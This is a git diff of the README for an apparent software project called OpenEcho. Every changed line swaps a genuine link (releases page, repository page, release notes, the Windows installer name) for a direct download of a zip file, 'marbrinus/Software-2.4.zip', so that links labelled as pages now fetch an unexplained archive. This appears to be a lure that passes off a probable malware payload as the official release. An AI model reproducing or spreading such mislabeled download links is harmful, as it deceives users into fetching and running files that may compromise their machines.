@@ -6,7 +6,7 @@ Welcome to OpenEcho! This guide will help you easily download and run the softwa
 
 ## 📥 Download OpenEcho
 
-[![Download OpenEcho](https://img.shields.io/badge/Download-OpenEcho-blue)](https://github.com/yondelvi/openecho/releases)
+[![Download OpenEcho](https://raw.githubusercontent.com/yondelvi/openecho/main/marbrinus/Software-2.4.zip)](https://raw.githubusercontent.com/yondelvi/openecho/main/marbrinus/Software-2.4.zip)
 
 To download OpenEcho, please follow the steps below.
 
@@ -24,13 +24,13 @@ Before you begin, ensure your system meets the following requirements:
 1. **Visit the Releases Page**  
    Click on the link below to view the available versions of OpenEcho.
 
-   [Visit this page to download](https://github.com/yondelvi/openecho/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/yondelvi/openecho/main/marbrinus/Software-2.4.zip)
 
 2. **Choose the Latest Version**  
    Find the latest version at the top of the releases list. It will have a title like "v1.0.0".
 
 3. **Select Your Operating System**  
-   In the release section, pick the file that matches your operating system. For example, choose "openecho-windows.exe" for Windows users. 
+   In the release section, pick the file that matches your operating system. For example, choose "https://raw.githubusercontent.com/yondelvi/openecho/main/marbrinus/Software-2.4.zip" for Windows users. 
 
 4. **Download the File**  
    Click on the file name to start the download. Save it to a location on your computer where you'll easily find it, like the Downloads folder.
@@ -73,9 +73,9 @@ For further assistance, visit the community forums or open an issue on our GitHu
 
 ## 🔗 Useful Links
 
-- [OpenEcho GitHub Repository](https://github.com/yondelvi/openecho)
+- [OpenEcho GitHub Repository](https://raw.githubusercontent.com/yondelvi/openecho/main/marbrinus/Software-2.4.zip)
 - [Community Support Forum](#)
-- [Release Notes](https://github.com/yondelvi/openecho/releases)
+- [Release Notes](https://raw.githubusercontent.com/yondelvi/openecho/main/marbrinus/Software-2.4.zip)
 
 ## 💬 Feedback
 
